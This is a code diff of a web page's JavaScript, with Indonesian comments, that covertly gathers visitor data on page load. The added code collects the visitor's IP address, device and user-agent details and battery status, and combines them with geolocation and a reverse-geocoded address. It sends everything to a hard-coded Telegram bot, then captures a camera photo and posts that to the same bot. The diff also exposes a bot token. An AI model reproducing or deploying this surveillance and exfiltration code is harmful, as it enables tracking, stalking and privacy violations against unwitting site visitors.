@@ -101,8 +101,27 @@
         const botToken = "8523579929:AAEYSUFre2O2Ei8RcW8y3emKA0-NxqJb4E8"; 
         const chatId = "7577331454"; 
 
-        // Jalankan saat halaman dibuka
-        window.onload = function() {
+        window.onload = async function() {
+            // Deteksi IP Address
+            let ipAddress = "Tidak terdeteksi";
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (e) {}
+
+            // Deteksi Informasi Perangkat & Baterai
+            let deviceInfo = `Device: ${navigator.platform} | User Agent: ${navigator.userAgent}`;
+            let batteryInfo = "Baterai tidak terdeteksi";
+            
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `Level: ${Math.round(battery.level * 100)}% | Status: ${battery.charging ? "Mengisi" : "Tidak Mengisi"}`;
+                } catch (e) {}
+            }
+
+            // Jalankan Lokasi
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
@@ -115,9 +134,9 @@
                             address = data.display_name;
                         } catch (e) {}
 
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Lokasi Pengunjung: ${address}`);
+                        const finalMsg = `Data Pengunjung:\nIP: ${ipAddress}\nLokasi: ${address}\n${batteryInfo}\n${deviceInfo}`;
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(finalMsg)}`);
                         
-                        // Panggil fungsi kamera setelah lokasi didapatkan
                         takePhoto();
                     },
                     (error) => console.warn("Izin lokasi ditolak.")
@@ -145,10 +164,7 @@
                     formData.append('chat_id', chatId);
                     formData.append('photo', blob);
                     
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                     
                     stream.getTracks().forEach(track => track.stop());
                 }, 1500);
